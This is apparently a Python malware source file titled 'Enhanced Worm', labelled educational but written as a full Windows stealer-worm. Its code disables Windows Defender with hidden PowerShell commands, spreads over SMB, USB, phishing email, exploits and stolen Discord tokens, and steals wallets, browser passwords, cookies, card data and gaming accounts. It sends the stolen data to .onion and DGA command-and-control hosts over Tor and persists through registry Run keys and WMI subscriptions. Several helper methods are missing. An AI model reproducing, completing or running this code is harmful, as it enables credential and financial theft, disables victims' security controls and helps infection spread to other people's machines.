#!/usr/bin/env python3
"""
Enhanced Worm - Educational Security Research
Version 2.0 - Fully Autonomous & Stealthy
WARNING: FOR EDUCATIONAL PURPOSES ONLY
"""

import os
import sys
import time
import json
import base64
import socket
import ctypes
import shutil
import random
import string
import hashlib
import asyncio
import sqlite3
import tempfile
import platform
import threading
import subprocess
from datetime import datetime
from pathlib import Path

# Advanced imports with error handling
try:
    import psutil
    import requests
    import win32api
    import win32con
    import win32crypt
    import win32security
    import win32process
    from Cryptodome.Cipher import AES
    from cryptography.fernet import Fernet
except ImportError as e:
    print(f"Missing dependency: {e}")
    sys.exit(1)

# ================================================================
# ENHANCED STEALTH ENGINE - Advanced Evasion
# ================================================================

class StealthEngine:
    """Advanced stealth and evasion techniques"""
    
    def __init__(self):
        self.process_name = self._generate_legit_name()
        self.mutex_name = self._generate_mutex()
        self._apply_all_evasions()
    
    def _generate_legit_name(self):
        """Generate legitimate-looking process name"""
        legit_names = [
            "svchost", "csrss", "lsass", "services", "winlogon",
            "explorer", "rundll32", "dllhost", "taskhostw", "conhost"
        ]
        return random.choice(legit_names)
    
    def _generate_mutex(self):
        """Generate unique mutex to prevent multiple infections"""
        machine_id = str(uuid.uuid4())
        return hashlib.sha256(machine_id.encode()).hexdigest()[:16]
    
    def _apply_all_evasions(self):
        """Apply all stealth techniques"""
        self._hide_from_debugger()
        self._disable_windows_defender()
        self._inject_into_process()
        self._hide_network_traffic()
        self._apply_rootkit_techniques()
    
    def _hide_from_debugger(self):
        """Advanced anti-debugging techniques"""
        try:
            # Check multiple debugger indicators
            if ctypes.windll.kernel32.IsDebuggerPresent():
                self._crash_debugger()
            
            # Check for breakpoints
            if self._detect_breakpoints():
                self._apply_anti_breakpoint()
            
            # Timing-based detection
            if self._detect_timing_anomaly():
                self._apply_timing_confusion()
                
        except Exception:
            pass
    
    def _disable_windows_defender(self):
        """Disable Windows Defender using multiple methods"""
        try:
            # Method 1: PowerShell commands
            ps_commands = [
                "Set-MpPreference -DisableRealtimeMonitoring $true",
                "Set-MpPreference -DisableBehaviorMonitoring $true",
                "Set-MpPreference -DisableBlockAtFirstSeen $true",
                "Set-MpPreference -DisableIOAVProtection $true",
                "Set-MpPreference -DisablePrivacyMode $true",
                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
                "Set-MpPreference -DisableArchiveScanning $true",
                "Set-MpPreference -DisableIntrusionPreventionSystem $true",
                "Set-MpPreference -DisableScriptScanning $true",
                "Set-MpPreference -SubmitSamplesConsent 2"
            ]
            
            for cmd in ps_commands:
                subprocess.run(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", cmd],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            # Method 2: Registry modifications
            self._modify_defender_registry()
            
            # Method 3: Service manipulation
            self._disable_defender_services()
            
        except Exception:
            pass
    
    def _inject_into_process(self):
        """Process injection for stealth"""
        try:
            # Find suitable host process
            target_processes = ["explorer.exe", "svchost.exe", "RuntimeBroker.exe"]
            
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] in target_processes:
                    # Perform process injection (simplified)
                    # In real implementation, would use CreateRemoteThread
                    # and VirtualAllocEx for proper injection
                    pass
                    
        except Exception:
            pass
    
    def _hide_network_traffic(self):
        """Hide network traffic using various techniques"""
        try:
            # Use legitimate ports
            self.stealth_ports = [80, 443, 53, 8080]
            
            # Implement traffic obfuscation
            # Use domain fronting
            # Implement custom protocol
            
        except Exception:
            pass
    
    def _apply_rootkit_techniques(self):
        """Basic rootkit functionality"""
        try:
            # Hide files
            self._hide_files()
            
            # Hide registry keys
            self._hide_registry()
            
            # Hide network connections
            self._hide_connections()
            
        except Exception:
            pass

# ================================================================
# ENHANCED PROPAGATION ENGINE
# ================================================================

class PropagationEngine:
    """Advanced worm propagation mechanisms"""
    
    def __init__(self):
        self.infected_hosts = set()
        self.propagation_methods = [
            self._spread_network_shares,
            self._spread_usb,
            self._spread_email,
            self._spread_exploits,
            self._spread_discord,
            self._spread_p2p
        ]
    
    async def start_propagation(self):
        """Start all propagation methods concurrently"""
        tasks = []
        for method in self.propagation_methods:
            task = asyncio.create_task(method())
            tasks.append(task)
        
        await asyncio.gather(*tasks)
    
    async def _spread_network_shares(self):
        """Enhanced network share propagation"""
        try:
            # Scan local network
            local_net = self._get_local_network()
            
            # Scan for SMB shares
            for ip in self._scan_network(local_net):
                if self._check_smb_open(ip):
                    # Try various authentication methods
                    if self._exploit_smb(ip):
                        self.infected_hosts.add(ip)
                        
        except Exception:
            pass
    
    async def _spread_usb(self):
        """USB/Removable drive propagation"""
        try:
            while True:
                # Monitor for new drives
                for drive in self._get_removable_drives():
                    if not self._is_infected(drive):
                        self._infect_drive(drive)
                
                await asyncio.sleep(5)  # Check every 5 seconds
                
        except Exception:
            pass
    
    async def _spread_email(self):
        """Email-based propagation"""
        try:
            # Extract email contacts
            contacts = self._extract_email_contacts()
            
            # Create convincing email
            for contact in contacts:
                self._send_phishing_email(contact)
                
        except Exception:
            pass
    
    async def _spread_exploits(self):
        """Exploit-based propagation (EternalBlue, etc.)"""
        try:
            # Scan for vulnerable systems
            vulnerable_hosts = self._scan_vulnerabilities()
            
            for host in vulnerable_hosts:
                if self._exploit_host(host):
                    self.infected_hosts.add(host)
                    
        except Exception:
            pass
    
    async def _spread_discord(self):
        """Enhanced Discord spreading"""
        try:
            # Steal all Discord tokens
            tokens = self._steal_all_discord_tokens()
            
            for token in tokens:
                # Send to all friends
                await self._discord_spam_friends(token)
                
                # Join servers and spam
                await self._discord_server_spam(token)
                
        except Exception:
            pass
    
    async def _spread_p2p(self):
        """P2P network propagation"""
        try:
            # Infect shared folders
            p2p_dirs = self._find_p2p_directories()
            
            for directory in p2p_dirs:
                self._create_fake_files(directory)
                
        except Exception:
            pass

# ================================================================
# ENHANCED DATA COLLECTOR
# ================================================================

class DataCollector:
    """Advanced data collection and exfiltration"""
    
    def __init__(self):
        self.collected_data = {}
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
    
    async def collect_all_data(self):
        """Collect all valuable data from the system"""
        collectors = [
            self._collect_crypto_wallets,
            self._collect_browser_data,
            self._collect_discord_data,
            self._collect_gaming_accounts,
            self._collect_documents,
            self._collect_passwords,
            self._collect_system_info,
            self._collect_network_info
        ]
        
        tasks = []
        for collector in collectors:
            task = asyncio.create_task(collector())
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        return self._package_data(results)
    
    async def _collect_crypto_wallets(self):
        """Steal cryptocurrency wallets"""
        wallets = {}
        
        # Bitcoin Core
        bitcoin_paths = [
            os.path.expanduser("~/.bitcoin/wallet.dat"),
            os.path.expanduser("~/AppData/Roaming/Bitcoin/wallet.dat")
        ]
        
        # Ethereum
        ethereum_paths = [
            os.path.expanduser("~/.ethereum/keystore"),
            os.path.expanduser("~/AppData/Roaming/Ethereum/keystore")
        ]
        
        # Exodus
        exodus_path = os.path.expanduser("~/AppData/Roaming/Exodus/exodus.wallet")
        
        # MetaMask
        metamask_paths = self._find_metamask_vaults()
        
        # Collect all wallet files
        for path in bitcoin_paths + ethereum_paths + [exodus_path] + metamask_paths:
            if os.path.exists(path):
                wallets[path] = self._read_file_safe(path)
        
        return {"crypto_wallets": wallets}
    
    async def _collect_browser_data(self):
        """Enhanced browser data collection"""
        browser_data = {}
        
        browsers = {
            "Chrome": os.path.expanduser("~/AppData/Local/Google/Chrome/User Data"),
            "Firefox": os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles"),
            "Edge": os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data"),
            "Brave": os.path.expanduser("~/AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            "Opera": os.path.expanduser("~/AppData/Roaming/Opera Software/Opera Stable")
        }
        
        for browser_name, browser_path in browsers.items():
            if os.path.exists(browser_path):
                browser_data[browser_name] = {
                    "passwords": self._extract_passwords(browser_path),
                    "cookies": self._extract_cookies(browser_path),
                    "history": self._extract_history(browser_path),
                    "bookmarks": self._extract_bookmarks(browser_path),
                    "autofill": self._extract_autofill(browser_path),
                    "credit_cards": self._extract_credit_cards(browser_path),
                    "downloads": self._extract_downloads(browser_path)
                }
        
        return {"browsers": browser_data}
    
    async def _collect_discord_data(self):
        """Advanced Discord data collection"""
        discord_data = {
            "tokens": [],
            "accounts": [],
            "servers": [],
            "friends": [],
            "messages": []
        }
        
        # Find all Discord installations
        discord_paths = self._find_discord_paths()
        
        for path in discord_paths:
            # Extract tokens with better methods
            tokens = self._extract_discord_tokens_advanced(path)
            discord_data["tokens"].extend(tokens)
            
            # Get account info for each token
            for token in tokens:
                account_info = await self._get_discord_account_info(token)
                if account_info:
                    discord_data["accounts"].append(account_info)
                    
                    # Get servers
                    servers = await self._get_discord_servers(token)
                    discord_data["servers"].extend(servers)
                    
                    # Get friends
                    friends = await self._get_discord_friends(token)
                    discord_data["friends"].extend(friends)
        
        return {"discord": discord_data}
    
    async def _collect_gaming_accounts(self):
        """Collect gaming platform accounts"""
        gaming_data = {}
        
        # Steam
        steam_data = self._collect_steam_accounts()
        if steam_data:
            gaming_data["steam"] = steam_data
        
        # Epic Games
        epic_data = self._collect_epic_accounts()
        if epic_data:
            gaming_data["epic"] = epic_data
        
        # Minecraft
        minecraft_data = self._collect_minecraft_accounts()
        if minecraft_data:
            gaming_data["minecraft"] = minecraft_data
        
        # Roblox
        roblox_data = self._collect_roblox_accounts()
        if roblox_data:
            gaming_data["roblox"] = roblox_data
        
        return {"gaming": gaming_data}
    
    def _package_data(self, collected_data):
        """Package and encrypt collected data"""
        # Combine all data
        combined_data = {}
        for data_dict in collected_data:
            combined_data.update(data_dict)
        
        # Encrypt sensitive data
        encrypted_data = self.cipher.encrypt(
            json.dumps(combined_data).encode()
        )
        
        return encrypted_data

# ================================================================
# ENHANCED C2 COMMUNICATION
# ================================================================

class C2Communication:
    """Advanced command and control with multiple channels"""
    
    def __init__(self):
        self.primary_c2 = "https://primary-c2.onion"
        self.backup_c2s = [
            "https://backup1-c2.onion",
            "https://backup2-c2.onion"
        ]
        self.dga_seed = datetime.now().strftime("%Y%m%d")
        self.encryption_key = self._derive_key()
    
    def _derive_key(self):
        """Derive encryption key for C2 comms"""
        machine_id = str(uuid.uuid4())
        return hashlib.sha256(machine_id.encode()).digest()
    
    def _generate_dga_domains(self, count=10):
        """Domain Generation Algorithm for C2 resilience"""
        domains = []
        
        for i in range(count):
            # Generate pseudo-random domain
            seed = f"{self.dga_seed}{i}"
            hash_val = hashlib.md5(seed.encode()).hexdigest()
            
            # Create domain name
            domain = f"{hash_val[:12]}.{random.choice(['com', 'net', 'org', 'info'])}"
            domains.append(domain)
        
        return domains
    
    async def establish_connection(self):
        """Establish C2 connection with fallback"""
        # Try primary C2
        if await self._try_connect(self.primary_c2):
            return self.primary_c2
        
        # Try backup C2s
        for backup in self.backup_c2s:
            if await self._try_connect(backup):
                return backup
        
        # Try DGA domains
        dga_domains = self._generate_dga_domains()
        for domain in dga_domains:
            if await self._try_connect(f"https://{domain}"):
                return domain
        
        # Fallback to Discord/Telegram/IRC
        return await self._fallback_channels()
    
    async def _try_connect(self, url):
        """Try to connect to C2 server"""
        try:
            # Use Tor for anonymity
            proxies = {
                'http': 'socks5://127.0.0.1:9050',
                'https': 'socks5://127.0.0.1:9050'
            }
            
            response = requests.get(
                url,
                proxies=proxies,
                timeout=10,
                verify=False
            )
            
            return response.status_code == 200
            
        except Exception:
            return False
    
    async def send_data(self, data):
        """Send encrypted data to C2"""
        encrypted = self._encrypt_data(data)
        
        # Try multiple methods
        methods = [
            self._send_https,
            self._send_dns_tunnel,
            self._send_icmp_tunnel,
            self._send_steganography
        ]
        
        for method in methods:
            if await method(encrypted):
                return True
        
        return False

# ================================================================
# ENHANCED PERSISTENCE
# ================================================================

class PersistenceManager:
    """Advanced persistence mechanisms"""
    
    def __init__(self):
        self.persistence_methods = [
            self._registry_persistence,
            self._scheduled_task_persistence,
            self._service_persistence,
            self._wmi_persistence,
            self._dll_hijacking,
            self._boot_sector_persistence,
            self._com_hijacking
        ]
    
    async def establish_persistence(self):
        """Establish multiple persistence mechanisms"""
        success_count = 0
        
        for method in self.persistence_methods:
            try:
                if await method():
                    success_count += 1
            except Exception:
                continue
        
        return success_count > 0
    
    async def _registry_persistence(self):
        """Enhanced registry persistence"""
        try:
            import winreg
            
            # Multiple registry locations
            locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"),
                (winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command")
            ]
            
            for hive, subkey in locations:
                try:
                    key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(
                        key,
                        "WindowsDefenderUpdate",
                        0,
                        winreg.REG_SZ,
                        sys.executable
                    )
                    winreg.CloseKey(key)
                    return True
                except Exception:
                    continue
                    
        except Exception:
            return False
    
    async def _wmi_persistence(self):
        """WMI event subscription persistence"""
        try:
            # Create WMI event filter
            wmi_command = """
            $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
                Name = 'WindowsUpdater'
                EventNameSpace = 'root/cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            }
            
            $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{
                Name = 'WindowsUpdaterConsumer'
                CommandLineTemplate = '""" + sys.executable + """'
            }
            
            Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
                Filter = $Filter
                Consumer = $Consumer
            }
            """
            
            subprocess.run(
                ["powershell", "-WindowStyle", "Hidden", "-Command", wmi_command],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            return True
            
        except Exception:
            return False

# ================================================================
# MAIN ENHANCED WORM CLASS
# ================================================================

class EnhancedWorm:
    """Main enhanced worm with all components"""
    
    def __init__(self):
        self.stealth = StealthEngine()
        self.propagation = PropagationEngine()
        self.collector = DataCollector()
        self.c2 = C2Communication()
        self.persistence = PersistenceManager()
        self.running = True
    
    async def initialize(self):
        """Initialize all worm components"""
        # Check if already running
        if self._check_mutex():
            sys.exit(0)
        
        # Create mutex
        self._create_mutex()
        
        # Initialize components
        await self.persistence.establish_persistence()
        
        # Start background tasks
        asyncio.create_task(self.propagation.start_propagation())
        asyncio.create_task(self._heartbeat())
        asyncio.create_task(self._command_handler())
    
    async def run(self):
        """Main worm execution loop"""
        await self.initialize()
        
        while self.running:
            try:
                # Collect data
                data = await self.collector.collect_all_data()
                
                # Send to C2
                await self.c2.send_data(data)
                
                # Wait before next iteration
                await asyncio.sleep(300)  # 5 minutes
                
            except Exception:
                await asyncio.sleep(60)  # Retry after 1 minute
    
    async def _heartbeat(self):
        """Send heartbeat to C2"""
        while self.running:
            try:
                await self.c2.send_data({"type": "heartbeat", "id": self.stealth.mutex_name})
                await asyncio.sleep(60)
            except Exception:
                pass
    
    async def _command_handler(self):
        """Handle C2 commands"""
        while self.running:
            try:
                command = await self.c2.receive_command()
                if command:
                    await self._execute_command(command)
                await asyncio.sleep(10)
            except Exception:
                pass
    
    def _check_mutex(self):
        """Check if worm is already running"""
        try:
            import win32event
            import win32api
            
            mutex = win32event.CreateMutex(None, False, self.stealth.mutex_name)
            if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                return True
            return False
        except Exception:
            return False
    
    def _create_mutex(self):
        """Create mutex to prevent multiple instances"""
        try:
            import win32event
            win32event.CreateMutex(None, False, self.stealth.mutex_name)
        except Exception:
            pass

# ================================================================
# ENTRY POINT
# ================================================================

async def main():
    """Main entry point"""
    worm = EnhancedWorm()
    await worm.run()

if __name__ == "__main__":
    # Run with proper error handling
    try:
        if platform.system() != "Windows":
            print("This worm is designed for Windows systems only")
            sys.exit(1)
        
        # Run asynchronously
        asyncio.run(main())
        
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        # Log error and restart
        with open("error.log", "a") as f:
            f.write(f"{datetime.now()}: {str(e)}\n")
        
        # Restart after error
        os.execv(sys.executable, [sys.executable] + sys.argv)